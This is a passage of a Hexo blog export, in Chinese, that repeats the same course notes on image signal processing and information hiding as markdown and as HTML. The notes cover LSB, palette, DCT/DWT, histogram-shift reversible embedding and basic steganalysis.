1.LSB替换方法\n\n将样点的最低比特位进行替换；\n\n替换规则\n\n同步\n\n抗干扰\n$$\n载体空间{j1,j2.j3...jL(c)},L(c)是载体长度\n$$\n\n$$\n嵌入信息空间{m1,m2,...,mL(m)}, L(c)是载体长度\n$$\n\n$$\n伪装载体空间{j'1,j'2,...,j'L(c')}   。。。载体长度\n$$\n\n##### 算法步骤：\n\n（1）嵌入过程\n\n- 根据L(m)值选择载体子集；\n- 将载体子集的每个元素的最低比特位用mi替换；\n\n（2）提取过程\n\n- 找到位置，提取出来，重新排列成mi\n\n##### 嵌入点选择\n\n- 连续方法；\n- 随机间隔；\n- 伪随机置换法：共享ket，生成索引序列，将k处的mk隐藏带jk上；如果重复，则选择下一个；\n\n##### 算法分析\n\n优点：简单易于实现，隐藏容量打；\n\n缺点：安全性不强，鲁棒性不高；不能抵抗有损压缩，滤波，加噪等手段；\n\n改进：安全性方面对m进行加密处理；鲁棒性方面，多次重复嵌入，增加冗余，或者加上纠错编码；\n\n\n\n#### 2.调色板图像隐藏方法\n\n##### 图像的组成\n\n直接像素；\t调色板；\n\n（1）调色板表数据：修改调色表值；\n\n（2）实际图像点索引值：危险，相邻索引颜色差异会很大；\n\n##### 灰度图三种颜色必须一起修改\n\n优缺点：简单，健壮性差；\n\n#### 3.基于量化编码\n\n#### 4.二值图像中的信息隐藏\n\n传真、徽标：冗余信息少；\n\n##### Zhao方法：特定区域中黑色图像的个数\n\n$$\n区域内黑色数量大于1/2，嵌入0，否则嵌入1；\n$$\n\n不能修改太多，需要修改太多的设定为无效项；\n\n###### 5.游程方法\n\nm为0，游程长度为偶数，m1，为奇数\n\n#### （二）变换域隐藏技术\n\n在载体重要部位隐藏，抗攻击，不可察觉；\n\n#### 1.DCT变换\n\n8*8块，安装Zig-Zag排列，最重要的在前面\n\n隐藏方法：中频系数修改\n$$\nx'(i,j)=x(i,j)+am(i)\n$$\n\n$$\nx'(i,j)=x(i,j)(1+am(i))\n$$\n\n需要原图像，经过相减除以a求出m\n\n##### 利用特定数的相对大小来进行信息隐藏\n\n伪随机选择\n$$\nBi(u1,v2)   >,     m=1\n$$\n\n$$\nBi(u2,v2)  <,  m=0\n$$\n\nNote:\n\n- 当m值大小与m不一致时，大小关系互换；\n- 互换影响太大就设定为无效项；\n- 还有三项不等关系的方法；\n\n#### 2.DWT信息隐藏\n\n##### 小波变换\n\n低频部分、水平细节、垂直细节、对角线细节\n\n类似DCT系数隐藏的方法任然适用；\n\n##### 图像隐藏算法\n\n- 初始化\n- 小波变换，主要是对低频分量进行隐藏\n- 矢量量化，映射\n- 加密和信息隐藏\n\n#### 3.DFT隐藏方法\n\n参数有虚数实数，实数部分要求对称；\n\n#### 4.回声隐藏算法\n\n#### 5.算法总结\n\n- 加密强度高\n- 健壮性好\n\n#### （三）文件格式隐藏法\n\n##### BMP文件格式隐藏\n\n会改变文件大小\n\n#### （四）可逆信息隐藏实例\n\n#### 1.基于直方图平移的可逆信息隐藏\n\n- 确定直方图峰值点和谷点，峰值点表示图像中样点值最多的数值点；选择峰值点整体右移直方图的目的是，空出取值最多的样点，提高嵌入容量；\n- 直方图右移；\n\n![](https://s3.bmp.ovh/imgs/2022/10/29/51d92d5f22626ca7.png)\n\n- 针对直方图空隙进行信息嵌入，嵌入规则如下：\n  $$\n  若嵌入的bit为1,则将pp的值+1；\n  $$\n\n  $$\n  若嵌入的比特为0，则pp值不变；\n  $$\n\n  详细链接：\n\n  https://blog.csdn.net/q15516221118/article/details/113617278\n\n### 三、信息隐藏分析\n\n#### 1.基本分析步骤\n\n1. 检测是否藏有秘密信息；\n2. 如果有，如何进行秘密信息的提取；怎样在不被接受者发现的情况下破坏；\n\n#### 2.发现隐藏信息\n\n- 时域隐藏，变换域隐藏，统计等；\n- 根据可能的方法判断分析载体的变化来判断是否有信息的隐藏；\n- LSB方法：主观上，查看有无明显的变化；客观上，统计分析噪声特性；\n- 调色板方法：一般调色板按照颜色的使用多少排列。是否违反或者有很多空余的调色板索引；\n- 变换域方法：尝试变换查找；\n\n- 变形技术：主管分析；\n- 载体生成技术：是否符合人类阅读习惯；\n- 文件隐藏：文件大小是否异常；\n\n\n\n\n\n\n\n\n\n","source":"_posts/图像信号处理基础.md","raw":"---\ntitle: 图像信号处理基础\ndate: 2022-10-29 15:09:00\ncategories: \n    - 信息隐藏\ntags: \n    - 信息隐藏\nmp3: \ncover: img/2.jpg\n---\n\n\n# 图像信号处理基础\n\n### 一、图像信号基础\n\n#### 1.图像表示\n\n像素点\n\n#### 2.图像压缩方法\n\nJPEG等；\n\n![](https://s3.bmp.ovh/imgs/2022/10/28/b46fcc4dbfac830a.png)\n\n#### 3.常用图像处理方法\n\n- 二维DFT\n- 二维DWT\n- 二维DCT\n\n### 二、信息隐藏基本原理\n\n#### 1.信息隐藏概念\n\n不可视通信，阈下通信\n$$\nC 载体对象；M 秘密信息； C'伪装对象；\n$$\n![](https://s3.bmp.ovh/imgs/2022/10/28/810382446257649f.png)\n\n纯粹安全性：第三方有没有能力将载体对象和伪装对象区分；\n\n#### 2.载体选择\n\n冗余空间、声音图像、载体样本使用次数仅1；\n\n### 三、信息隐藏技术\n\n#### （一）时域替换技术\n\n#### 1.LSB替换方法\n\n将样点的最低比特位进行替换；\n\n替换规则\n\n同步\n\n抗干扰\n$$\n载体空间{j1,j2.j3...jL(c)},L(c)是载体长度\n$$\n\n$$\n嵌入信息空间{m1,m2,...,mL(m)}, L(c)是载体长度\n$$\n\n$$\n伪装载体空间{j'1,j'2,...,j'L(c')}   。。。载体长度\n$$\n\n##### 算法步骤：\n\n（1）嵌入过程\n\n- 根据L(m)值选择载体子集；\n- 将载体子集的每个元素的最低比特位用mi替换；\n\n（2）提取过程\n\n- 找到位置，提取出来，重新排列成mi\n\n##### 嵌入点选择\n\n- 连续方法；\n- 随机间隔；\n- 伪随机置换法：共享ket，生成索引序列，将k处的mk隐藏带jk上；如果重复，则选择下一个；\n\n##### 算法分析\n\n优点：简单易于实现，隐藏容量打；\n\n缺点：安全性不强，鲁棒性不高；不能抵抗有损压缩，滤波，加噪等手段；\n\n改进：安全性方面对m进行加密处理；鲁棒性方面，多次重复嵌入，增加冗余，或者加上纠错编码；\n\n\n\n#### 2.调色板图像隐藏方法\n\n##### 图像的组成\n\n直接像素；\t调色板；\n\n（1）调色板表数据：修改调色表值；\n\n（2）实际图像点索引值：危险，相邻索引颜色差异会很大；\n\n##### 灰度图三种颜色必须一起修改\n\n优缺点：简单，健壮性差；\n\n#### 3.基于量化编码\n\n#### 4.二值图像中的信息隐藏\n\n传真、徽标：冗余信息少；\n\n##### Zhao方法：特定区域中黑色图像的个数\n\n$$\n区域内黑色数量大于1/2，嵌入0，否则嵌入1；\n$$\n\n不能修改太多，需要修改太多的设定为无效项；\n\n###### 5.游程方法\n\nm为0，游程长度为偶数，m1，为奇数\n\n#### （二）变换域隐藏技术\n\n在载体重要部位隐藏，抗攻击，不可察觉；\n\n#### 1.DCT变换\n\n8*8块，安装Zig-Zag排列，最重要的在前面\n\n隐藏方法：中频系数修改\n$$\nx'(i,j)=x(i,j)+am(i)\n$$\n\n$$\nx'(i,j)=x(i,j)(1+am(i))\n$$\n\n需要原图像，经过相减除以a求出m\n\n##### 利用特定数的相对大小来进行信息隐藏\n\n伪随机选择\n$$\nBi(u1,v2)   >,     m=1\n$$\n\n$$\nBi(u2,v2)  <,  m=0\n$$\n\nNote:\n\n- 当m值大小与m不一致时，大小关系互换；\n- 互换影响太大就设定为无效项；\n- 还有三项不等关系的方法；\n\n#### 2.DWT信息隐藏\n\n##### 小波变换\n\n低频部分、水平细节、垂直细节、对角线细节\n\n类似DCT系数隐藏的方法任然适用；\n\n##### 图像隐藏算法\n\n- 初始化\n- 小波变换，主要是对低频分量进行隐藏\n- 矢量量化，映射\n- 加密和信息隐藏\n\n#### 3.DFT隐藏方法\n\n参数有虚数实数，实数部分要求对称；\n\n#### 4.回声隐藏算法\n\n#### 5.算法总结\n\n- 加密强度高\n- 健壮性好\n\n#### （三）文件格式隐藏法\n\n##### BMP文件格式隐藏\n\n会改变文件大小\n\n#### （四）可逆信息隐藏实例\n\n#### 1.基于直方图平移的可逆信息隐藏\n\n- 确定直方图峰值点和谷点，峰值点表示图像中样点值最多的数值点；选择峰值点整体右移直方图的目的是，空出取值最多的样点，提高嵌入容量；\n- 直方图右移；\n\n![](https://s3.bmp.ovh/imgs/2022/10/29/51d92d5f22626ca7.png)\n\n- 针对直方图空隙进行信息嵌入，嵌入规则如下：\n  $$\n  若嵌入的bit为1,则将pp的值+1；\n  $$\n\n  $$\n  若嵌入的比特为0，则pp值不变；\n  $$\n\n  详细链接：\n\n  https://blog.csdn.net/q15516221118/article/details/113617278\n\n### 三、信息隐藏分析\n\n#### 1.基本分析步骤\n\n1. 检测是否藏有秘密信息；\n2. 如果有，如何进行秘密信息的提取；怎样在不被接受者发现的情况下破坏；\n\n#### 2.发现隐藏信息\n\n- 时域隐藏，变换域隐藏，统计等；\n- 根据可能的方法判断分析载体的变化来判断是否有信息的隐藏；\n- LSB方法：主观上，查看有无明显的变化；客观上，统计分析噪声特性；\n- 调色板方法：一般调色板按照颜色的使用多少排列。是否违反或者有很多空余的调色板索引；\n- 变换域方法：尝试变换查找；\n\n- 变形技术：主管分析；\n- 载体生成技术：是否符合人类阅读习惯；\n- 文件隐藏：文件大小是否异常；\n\n\n\n\n\n\n\n\n\n","slug":"图像信号处理基础","published":1,"updated":"2022-10-29T07:59:07.765Z","_id":"clg29vyhw0058ao9c79a1eeqo","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"图像信号处理基础\"><a href=\"#图像信号处理基础\" class=\"headerlink\" title=\"图像信号处理基础\"></a>图像信号处理基础</h1><h3 id=\"一、图像信号基础\"><a href=\"#一、图像信号基础\" class=\"headerlink\" title=\"一、图像信号基础\"></a>一、图像信号基础</h3><h4 id=\"1-图像表示\"><a href=\"#1-图像表示\" class=\"headerlink\" title=\"1.图像表示\"></a>1.图像表示</h4><p>像素点</p>\n<h4 id=\"2-图像压缩方法\"><a href=\"#2-图像压缩方法\" class=\"headerlink\" title=\"2.图像压缩方法\"></a>2.图像压缩方法</h4><p>JPEG等；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/b46fcc4dbfac830a.png\"></p>\n<h4 id=\"3-常用图像处理方法\"><a href=\"#3-常用图像处理方法\" class=\"headerlink\" title=\"3.常用图像处理方法\"></a>3.常用图像处理方法</h4><ul>\n<li>二维DFT</li>\n<li>二维DWT</li>\n<li>二维DCT</li>\n</ul>\n<h3 id=\"二、信息隐藏基本原理\"><a href=\"#二、信息隐藏基本原理\" class=\"headerlink\" title=\"二、信息隐藏基本原理\"></a>二、信息隐藏基本原理</h3><h4 id=\"1-信息隐藏概念\"><a href=\"#1-信息隐藏概念\" class=\"headerlink\" title=\"1.信息隐藏概念\"></a>1.信息隐藏概念</h4><p>不可视通信，阈下通信<br>$$<br>C 载体对象；M 秘密信息； C’伪装对象；<br>$$<br><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/810382446257649f.png\"></p>\n<p>纯粹安全性：第三方有没有能力将载体对象和伪装对象区分；</p>\n<h4 id=\"2-载体选择\"><a href=\"#2-载体选择\" class=\"headerlink\" title=\"2.载体选择\"></a>2.载体选择</h4><p>冗余空间、声音图像、载体样本使用次数仅1；</p>\n<h3 id=\"三、信息隐藏技术\"><a href=\"#三、信息隐藏技术\" class=\"headerlink\" title=\"三、信息隐藏技术\"></a>三、信息隐藏技术</h3><h4 id=\"（一）时域替换技术\"><a href=\"#（一）时域替换技术\" class=\"headerlink\" title=\"（一）时域替换技术\"></a>（一）时域替换技术</h4><h4 id=\"1-LSB替换方法\"><a href=\"#1-LSB替换方法\" class=\"headerlink\" title=\"1.LSB替换方法\"></a>1.LSB替换方法</h4><p>将样点的最低比特位进行替换；</p>\n<p>替换规则</p>\n<p>同步</p>\n<p>抗干扰<br>$$<br>载体空间{j1,j2.j3…jL(c)},L(c)是载体长度<br>$$</p>\n<p>$$<br>嵌入信息空间{m1,m2,…,mL(m)}, L(c)是载体长度<br>$$</p>\n<p>$$<br>伪装载体空间{j’1,j’2,…,j’L(c’)}   。。。载体长度<br>$$</p>\n<h5 id=\"算法步骤：\"><a href=\"#算法步骤：\" class=\"headerlink\" title=\"算法步骤：\"></a>算法步骤：</h5><p>（1）嵌入过程</p>\n<ul>\n<li>根据L(m)值选择载体子集；</li>\n<li>将载体子集的每个元素的最低比特位用mi替换；</li>\n</ul>\n<p>（2）提取过程</p>\n<ul>\n<li>找到位置，提取出来，重新排列成mi</li>\n</ul>\n<h5 id=\"嵌入点选择\"><a href=\"#嵌入点选择\" class=\"headerlink\" title=\"嵌入点选择\"></a>嵌入点选择</h5><ul>\n<li>连续方法；</li>\n<li>随机间隔；</li>\n<li>伪随机置换法：共享ket，生成索引序列，将k处的mk隐藏带jk上；如果重复，则选择下一个；</li>\n</ul>\n<h5 id=\"算法分析\"><a href=\"#算法分析\" class=\"headerlink\" title=\"算法分析\"></a>算法分析</h5><p>优点：简单易于实现，隐藏容量打；</p>\n<p>缺点：安全性不强，鲁棒性不高；不能抵抗有损压缩，滤波，加噪等手段；</p>\n<p>改进：安全性方面对m进行加密处理；鲁棒性方面，多次重复嵌入，增加冗余，或者加上纠错编码；</p>\n<h4 id=\"2-调色板图像隐藏方法\"><a href=\"#2-调色板图像隐藏方法\" class=\"headerlink\" title=\"2.调色板图像隐藏方法\"></a>2.调色板图像隐藏方法</h4><h5 id=\"图像的组成\"><a href=\"#图像的组成\" class=\"headerlink\" title=\"图像的组成\"></a>图像的组成</h5><p>直接像素；    调色板；</p>\n<p>（1）调色板表数据：修改调色表值；</p>\n<p>（2）实际图像点索引值：危险，相邻索引颜色差异会很大；</p>\n<h5 id=\"灰度图三种颜色必须一起修改\"><a href=\"#灰度图三种颜色必须一起修改\" class=\"headerlink\" title=\"灰度图三种颜色必须一起修改\"></a>灰度图三种颜色必须一起修改</h5><p>优缺点：简单，健壮性差；</p>\n<h4 id=\"3-基于量化编码\"><a href=\"#3-基于量化编码\" class=\"headerlink\" title=\"3.基于量化编码\"></a>3.基于量化编码</h4><h4 id=\"4-二值图像中的信息隐藏\"><a href=\"#4-二值图像中的信息隐藏\" class=\"headerlink\" title=\"4.二值图像中的信息隐藏\"></a>4.二值图像中的信息隐藏</h4><p>传真、徽标：冗余信息少；</p>\n<h5 id=\"Zhao方法：特定区域中黑色图像的个数\"><a href=\"#Zhao方法：特定区域中黑色图像的个数\" class=\"headerlink\" title=\"Zhao方法：特定区域中黑色图像的个数\"></a>Zhao方法：特定区域中黑色图像的个数</h5><p>$$<br>区域内黑色数量大于1/2，嵌入0，否则嵌入1；<br>$$</p>\n<p>不能修改太多，需要修改太多的设定为无效项；</p>\n<h6 id=\"5-游程方法\"><a href=\"#5-游程方法\" class=\"headerlink\" title=\"5.游程方法\"></a>5.游程方法</h6><p>m为0，游程长度为偶数，m1，为奇数</p>\n<h4 id=\"（二）变换域隐藏技术\"><a href=\"#（二）变换域隐藏技术\" class=\"headerlink\" title=\"（二）变换域隐藏技术\"></a>（二）变换域隐藏技术</h4><p>在载体重要部位隐藏，抗攻击，不可察觉；</p>\n<h4 id=\"1-DCT变换\"><a href=\"#1-DCT变换\" class=\"headerlink\" title=\"1.DCT变换\"></a>1.DCT变换</h4><p>8*8块，安装Zig-Zag排列，最重要的在前面</p>\n<p>隐藏方法：中频系数修改<br>$$<br>x’(i,j)=x(i,j)+am(i)<br>$$</p>\n<p>$$<br>x’(i,j)=x(i,j)(1+am(i))<br>$$</p>\n<p>需要原图像，经过相减除以a求出m</p>\n<h5 id=\"利用特定数的相对大小来进行信息隐藏\"><a href=\"#利用特定数的相对大小来进行信息隐藏\" class=\"headerlink\" title=\"利用特定数的相对大小来进行信息隐藏\"></a>利用特定数的相对大小来进行信息隐藏</h5><p>伪随机选择<br>$$<br>Bi(u1,v2)   &gt;,     m=1<br>$$</p>\n<p>$$<br>Bi(u2,v2)  &lt;,  m=0<br>$$</p>\n<p>Note:</p>\n<ul>\n<li>当m值大小与m不一致时，大小关系互换；</li>\n<li>互换影响太大就设定为无效项；</li>\n<li>还有三项不等关系的方法；</li>\n</ul>\n<h4 id=\"2-DWT信息隐藏\"><a href=\"#2-DWT信息隐藏\" class=\"headerlink\" title=\"2.DWT信息隐藏\"></a>2.DWT信息隐藏</h4><h5 id=\"小波变换\"><a href=\"#小波变换\" class=\"headerlink\" title=\"小波变换\"></a>小波变换</h5><p>低频部分、水平细节、垂直细节、对角线细节</p>\n<p>类似DCT系数隐藏的方法任然适用；</p>\n<h5 id=\"图像隐藏算法\"><a href=\"#图像隐藏算法\" class=\"headerlink\" title=\"图像隐藏算法\"></a>图像隐藏算法</h5><ul>\n<li>初始化</li>\n<li>小波变换，主要是对低频分量进行隐藏</li>\n<li>矢量量化，映射</li>\n<li>加密和信息隐藏</li>\n</ul>\n<h4 id=\"3-DFT隐藏方法\"><a href=\"#3-DFT隐藏方法\" class=\"headerlink\" title=\"3.DFT隐藏方法\"></a>3.DFT隐藏方法</h4><p>参数有虚数实数，实数部分要求对称；</p>\n<h4 id=\"4-回声隐藏算法\"><a href=\"#4-回声隐藏算法\" class=\"headerlink\" title=\"4.回声隐藏算法\"></a>4.回声隐藏算法</h4><h4 id=\"5-算法总结\"><a href=\"#5-算法总结\" class=\"headerlink\" title=\"5.算法总结\"></a>5.算法总结</h4><ul>\n<li>加密强度高</li>\n<li>健壮性好</li>\n</ul>\n<h4 id=\"（三）文件格式隐藏法\"><a href=\"#（三）文件格式隐藏法\" class=\"headerlink\" title=\"（三）文件格式隐藏法\"></a>（三）文件格式隐藏法</h4><h5 id=\"BMP文件格式隐藏\"><a href=\"#BMP文件格式隐藏\" class=\"headerlink\" title=\"BMP文件格式隐藏\"></a>BMP文件格式隐藏</h5><p>会改变文件大小</p>\n<h4 id=\"（四）可逆信息隐藏实例\"><a href=\"#（四）可逆信息隐藏实例\" class=\"headerlink\" title=\"（四）可逆信息隐藏实例\"></a>（四）可逆信息隐藏实例</h4><h4 id=\"1-基于直方图平移的可逆信息隐藏\"><a href=\"#1-基于直方图平移的可逆信息隐藏\" class=\"headerlink\" title=\"1.基于直方图平移的可逆信息隐藏\"></a>1.基于直方图平移的可逆信息隐藏</h4><ul>\n<li>确定直方图峰值点和谷点，峰值点表示图像中样点值最多的数值点；选择峰值点整体右移直方图的目的是，空出取值最多的样点，提高嵌入容量；</li>\n<li>直方图右移；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/29/51d92d5f22626ca7.png\"></p>\n<ul>\n<li><p>针对直方图空隙进行信息嵌入，嵌入规则如下：<br>$$<br>若嵌入的bit为1,则将pp的值+1；<br>$$</p>\n<p>$$<br>若嵌入的比特为0，则pp值不变；<br>$$</p>\n<p>详细链接：</p>\n<p><a href=\"https://blog.csdn.net/q15516221118/article/details/113617278\">https://blog.csdn.net/q15516221118/article/details/113617278</a></p>\n</li>\n</ul>\n<h3 id=\"三、信息隐藏分析\"><a href=\"#三、信息隐藏分析\" class=\"headerlink\" title=\"三、信息隐藏分析\"></a>三、信息隐藏分析</h3><h4 id=\"1-基本分析步骤\"><a href=\"#1-基本分析步骤\" class=\"headerlink\" title=\"1.基本分析步骤\"></a>1.基本分析步骤</h4><ol>\n<li>检测是否藏有秘密信息；</li>\n<li>如果有，如何进行秘密信息的提取；怎样在不被接受者发现的情况下破坏；</li>\n</ol>\n<h4 id=\"2-发现隐藏信息\"><a href=\"#2-发现隐藏信息\" class=\"headerlink\" title=\"2.发现隐藏信息\"></a>2.发现隐藏信息</h4><ul>\n<li><p>时域隐藏，变换域隐藏，统计等；</p>\n</li>\n<li><p>根据可能的方法判断分析载体的变化来判断是否有信息的隐藏；</p>\n</li>\n<li><p>LSB方法：主观上，查看有无明显的变化；客观上，统计分析噪声特性；</p>\n</li>\n<li><p>调色板方法：一般调色板按照颜色的使用多少排列。是否违反或者有很多空余的调色板索引；</p>\n</li>\n<li><p>变换域方法：尝试变换查找；</p>\n</li>\n<li><p>变形技术：主管分析；</p>\n</li>\n<li><p>载体生成技术：是否符合人类阅读习惯；</p>\n</li>\n<li><p>文件隐藏：文件大小是否异常；</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"图像信号处理基础\"><a href=\"#图像信号处理基础\" class=\"headerlink\" title=\"图像信号处理基础\"></a>图像信号处理基础</h1><h3 id=\"一、图像信号基础\"><a href=\"#一、图像信号基础\" class=\"headerlink\" title=\"一、图像信号基础\"></a>一、图像信号基础</h3><h4 id=\"1-图像表示\"><a href=\"#1-图像表示\" class=\"headerlink\" title=\"1.图像表示\"></a>1.图像表示</h4><p>像素点</p>\n<h4 id=\"2-图像压缩方法\"><a href=\"#2-图像压缩方法\" class=\"headerlink\" title=\"2.图像压缩方法\"></a>2.图像压缩方法</h4><p>JPEG等；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/b46fcc4dbfac830a.png\"></p>\n<h4 id=\"3-常用图像处理方法\"><a href=\"#3-常用图像处理方法\" class=\"headerlink\" title=\"3.常用图像处理方法\"></a>3.常用图像处理方法</h4><ul>\n<li>二维DFT</li>\n<li>二维DWT</li>\n<li>二维DCT</li>\n</ul>\n<h3 id=\"二、信息隐藏基本原理\"><a href=\"#二、信息隐藏基本原理\" class=\"headerlink\" title=\"二、信息隐藏基本原理\"></a>二、信息隐藏基本原理</h3><h4 id=\"1-信息隐藏概念\"><a href=\"#1-信息隐藏概念\" class=\"headerlink\" title=\"1.信息隐藏概念\"></a>1.信息隐藏概念</h4><p>不可视通信，阈下通信<br>$$<br>C 载体对象；M 秘密信息； C’伪装对象；<br>$$<br><img src=\"https://s3.bmp.ovh/imgs/2022/10/28/810382446257649f.png\"></p>\n<p>纯粹安全性：第三方有没有能力将载体对象和伪装对象区分；</p>\n<h4 id=\"2-载体选择\"><a href=\"#2-载体选择\" class=\"headerlink\" title=\"2.载体选择\"></a>2.载体选择</h4><p>冗余空间、声音图像、载体样本使用次数仅1；</p>\n<h3 id=\"三、信息隐藏技术\"><a href=\"#三、信息隐藏技术\" class=\"headerlink\" title=\"三、信息隐藏技术\"></a>三、信息隐藏技术</h3><h4 id=\"（一）时域替换技术\"><a href=\"#（一）时域替换技术\" class=\"headerlink\" title=\"（一）时域替换技术\"></a>（一）时域替换技术</h4><h4 id=\"1-LSB替换方法\"><a href=\"#1-LSB替换方法\" class=\"headerlink\" title=\"1.LSB替换方法\"></a>1.LSB替换方法</h4><p>将样点的最低比特位进行替换；</p>\n<p>替换规则</p>\n<p>同步</p>\n<p>抗干扰<br>$$<br>载体空间{j1,j2.j3…jL(c)},L(c)是载体长度<br>$$</p>\n<p>$$<br>嵌入信息空间{m1,m2,…,mL(m)}, L(c)是载体长度<br>$$</p>\n<p>$$<br>伪装载体空间{j’1,j’2,…,j’L(c’)}   。。。载体长度<br>$$</p>\n<h5 id=\"算法步骤：\"><a href=\"#算法步骤：\" class=\"headerlink\" title=\"算法步骤：\"></a>算法步骤：</h5><p>（1）嵌入过程</p>\n<ul>\n<li>根据L(m)值选择载体子集；</li>\n<li>将载体子集的每个元素的最低比特位用mi替换；</li>\n</ul>\n<p>（2）提取过程</p>\n<ul>\n<li>找到位置，提取出来，重新排列成mi</li>\n</ul>\n<h5 id=\"嵌入点选择\"><a href=\"#嵌入点选择\" class=\"headerlink\" title=\"嵌入点选择\"></a>嵌入点选择</h5><ul>\n<li>连续方法；</li>\n<li>随机间隔；</li>\n<li>伪随机置换法：共享ket，生成索引序列，将k处的mk隐藏带jk上；如果重复，则选择下一个；</li>\n</ul>\n<h5 id=\"算法分析\"><a href=\"#算法分析\" class=\"headerlink\" title=\"算法分析\"></a>算法分析</h5><p>优点：简单易于实现，隐藏容量打；</p>\n<p>缺点：安全性不强，鲁棒性不高；不能抵抗有损压缩，滤波，加噪等手段；</p>\n<p>改进：安全性方面对m进行加密处理；鲁棒性方面，多次重复嵌入，增加冗余，或者加上纠错编码；</p>\n<h4 id=\"2-调色板图像隐藏方法\"><a href=\"#2-调色板图像隐藏方法\" class=\"headerlink\" title=\"2.调色板图像隐藏方法\"></a>2.调色板图像隐藏方法</h4><h5 id=\"图像的组成\"><a href=\"#图像的组成\" class=\"headerlink\" title=\"图像的组成\"></a>图像的组成</h5><p>直接像素；    调色板；</p>\n<p>（1）调色板表数据：修改调色表值；</p>\n<p>（2）实际图像点索引值：危险，相邻索引颜色差异会很大；</p>\n<h5 id=\"灰度图三种颜色必须一起修改\"><a href=\"#灰度图三种颜色必须一起修改\" class=\"headerlink\" title=\"灰度图三种颜色必须一起修改\"></a>灰度图三种颜色必须一起修改</h5><p>优缺点：简单，健壮性差；</p>\n<h4 id=\"3-基于量化编码\"><a href=\"#3-基于量化编码\" class=\"headerlink\" title=\"3.基于量化编码\"></a>3.基于量化编码</h4><h4 id=\"4-二值图像中的信息隐藏\"><a href=\"#4-二值图像中的信息隐藏\" class=\"headerlink\" title=\"4.二值图像中的信息隐藏\"></a>4.二值图像中的信息隐藏</h4><p>传真、徽标：冗余信息少；</p>\n<h5 id=\"Zhao方法：特定区域中黑色图像的个数\"><a href=\"#Zhao方法：特定区域中黑色图像的个数\" class=\"headerlink\" title=\"Zhao方法：特定区域中黑色图像的个数\"></a>Zhao方法：特定区域中黑色图像的个数</h5><p>$$<br>区域内黑色数量大于1/2，嵌入0，否则嵌入1；<br>$$</p>\n<p>不能修改太多，需要修改太多的设定为无效项；</p>\n<h6 id=\"5-游程方法\"><a href=\"#5-游程方法\" class=\"headerlink\" title=\"5.游程方法\"></a>5.游程方法</h6><p>m为0，游程长度为偶数，m1，为奇数</p>\n<h4 id=\"（二）变换域隐藏技术\"><a href=\"#（二）变换域隐藏技术\" class=\"headerlink\" title=\"（二）变换域隐藏技术\"></a>（二）变换域隐藏技术</h4><p>在载体重要部位隐藏，抗攻击，不可察觉；</p>\n<h4 id=\"1-DCT变换\"><a href=\"#1-DCT变换\" class=\"headerlink\" title=\"1.DCT变换\"></a>1.DCT变换</h4><p>8*8块，安装Zig-Zag排列，最重要的在前面</p>\n<p>隐藏方法：中频系数修改<br>$$<br>x’(i,j)=x(i,j)+am(i)<br>$$</p>\n<p>$$<br>x’(i,j)=x(i,j)(1+am(i))<br>$$</p>\n<p>需要原图像，经过相减除以a求出m</p>\n<h5 id=\"利用特定数的相对大小来进行信息隐藏\"><a href=\"#利用特定数的相对大小来进行信息隐藏\" class=\"headerlink\" title=\"利用特定数的相对大小来进行信息隐藏\"></a>利用特定数的相对大小来进行信息隐藏</h5><p>伪随机选择<br>$$<br>Bi(u1,v2)   &gt;,     m=1<br>$$</p>\n<p>$$<br>Bi(u2,v2)  &lt;,  m=0<br>$$</p>\n<p>Note:</p>\n<ul>\n<li>当m值大小与m不一致时，大小关系互换；</li>\n<li>互换影响太大就设定为无效项；</li>\n<li>还有三项不等关系的方法；</li>\n</ul>\n<h4 id=\"2-DWT信息隐藏\"><a href=\"#2-DWT信息隐藏\" class=\"headerlink\" title=\"2.DWT信息隐藏\"></a>2.DWT信息隐藏</h4><h5 id=\"小波变换\"><a href=\"#小波变换\" class=\"headerlink\" title=\"小波变换\"></a>小波变换</h5><p>低频部分、水平细节、垂直细节、对角线细节</p>\n<p>类似DCT系数隐藏的方法任然适用；</p>\n<h5 id=\"图像隐藏算法\"><a href=\"#图像隐藏算法\" class=\"headerlink\" title=\"图像隐藏算法\"></a>图像隐藏算法</h5><ul>\n<li>初始化</li>\n<li>小波变换，主要是对低频分量进行隐藏</li>\n<li>矢量量化，映射</li>\n<li>加密和信息隐藏</li>\n</ul>\n<h4 id=\"3-DFT隐藏方法\"><a href=\"#3-DFT隐藏方法\" class=\"headerlink\" title=\"3.DFT隐藏方法\"></a>3.DFT隐藏方法</h4><p>参数有虚数实数，实数部分要求对称；</p>\n<h4 id=\"4-回声隐藏算法\"><a href=\"#4-回声隐藏算法\" class=\"headerlink\" title=\"4.回声隐藏算法\"></a>4.回声隐藏算法</h4><h4 id=\"5-算法总结\"><a href=\"#5-算法总结\" class=\"headerlink\" title=\"5.算法总结\"></a>5.算法总结</h4><ul>\n<li>加密强度高</li>\n<li>健壮性好</li>\n</ul>\n<h4 id=\"（三）文件格式隐藏法\"><a href=\"#（三）文件格式隐藏法\" class=\"headerlink\" title=\"（三）文件格式隐藏法\"></a>（三）文件格式隐藏法</h4><h5 id=\"BMP文件格式隐藏\"><a href=\"#BMP文件格式隐藏\" class=\"headerlink\" title=\"BMP文件格式隐藏\"></a>BMP文件格式隐藏</h5><p>会改变文件大小</p>\n<h4 id=\"（四）可逆信息隐藏实例\"><a href=\"#（四）可逆信息隐藏实例\" class=\"headerlink\" title=\"（四）可逆信息隐藏实例\"></a>（四）可逆信息隐藏实例</h4><h4 id=\"1-基于直方图平移的可逆信息隐藏\"><a href=\"#1-基于直方图平移的可逆信息隐藏\" class=\"headerlink\" title=\"1.基于直方图平移的可逆信息隐藏\"></a>1.基于直方图平移的可逆信息隐藏</h4><ul>\n<li>确定直方图峰值点和谷点，峰值点表示图像中样点值最多的数值点；选择峰值点整体右移直方图的目的是，空出取值最多的样点，提高嵌入容量；</li>\n<li>直方图右移；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2022/10/29/51d92d5f22626ca7.png\"></p>\n<ul>\n<li><p>针对直方图空隙进行信息嵌入，嵌入规则如下：<br>$$<br>若嵌入的bit为1,则将pp的值+1；<br>$$</p>\n<p>$$<br>若嵌入的比特为0，则pp值不变；<br>$$</p>\n<p>详细链接：</p>\n<p><a 